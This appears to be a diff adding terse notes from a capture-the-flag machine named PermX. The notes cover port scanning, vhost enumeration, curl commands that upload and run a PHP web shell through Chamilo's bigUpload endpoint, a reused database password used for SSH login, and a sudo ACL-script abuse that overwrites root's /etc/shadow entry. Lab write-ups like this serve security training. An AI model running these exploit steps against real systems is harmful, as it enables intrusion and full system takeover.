@@ -1,0 +1,60 @@
+└─$ nmap -A 10.10.11.23 -p 1-65535 -T5 -Pn
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-07 15:42 CEST
+Warning: 10.10.11.23 giving up on port because retransmission cap hit (2).
+Nmap scan report for 10.10.11.23
+Host is up (0.034s latency).
+Not shown: 64175 closed tcp ports (conn-refused), 1358 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 e25c5d8c473ed872f7b4800349866def (ECDSA)
+|_  256 1f41028e6b17189ca0ac5423e9713017 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-title: Did not follow redirect to http://permx.htb
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 61.20 seconds
+
+
+gobuster vhost --append-domain  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u permx.htb -r
+
+
+Disallow: /app/
+Disallow: /bin/
+Disallow: /documentation/
+Disallow: /home/
+Disallow: /main/
+Disallow: /plugin/
+Disallow: /tests/
+Disallow: /vendor/
+
+# Files
+Disallow: /license.txt
+Disallow: /README.txt
+Disallow: /whoisonline.php
+Disallow: /whoisonlinesession.php
+
+
+cd downloads
+curl -F 'bigUploadFile=@rce.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
+curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php'
+
+mtz
+$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
+$_configuration['db_user'] = 'chamilo';
+
+ssh permx.htb -l mtz
+03F6lY3uXAP2bkW8
+
+mtz@permx:~$ ln -s / root
+mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/root/etc/shadow
+mtz@permx:~$ openssl passwd -6 axura
+$6$i2J0UDrv.LQCUYKJ$sazi/EjqTj1poH815Zg.e8cp9bLP3SLv9rbt3i.oVoASSe5/Uk6G5GyFxQDbVV8sjV8.WPzL2ZQpw9km.rJxt/
+mtz@permx:~$ echo 'root:$6$Bbo96JzpUZNj6cO/$ORCKfhmDLKaqBj6cGZevWuU2o7MRKA.8rVzXZN6sU69H.6OVeZqqvJ12do9XC1xRYxTofLLcSko7hP9gKzeoP/:19742:0:99999:7:::' > /etc/shadow
+mtz@permx:~$ su root
+
+
+
+
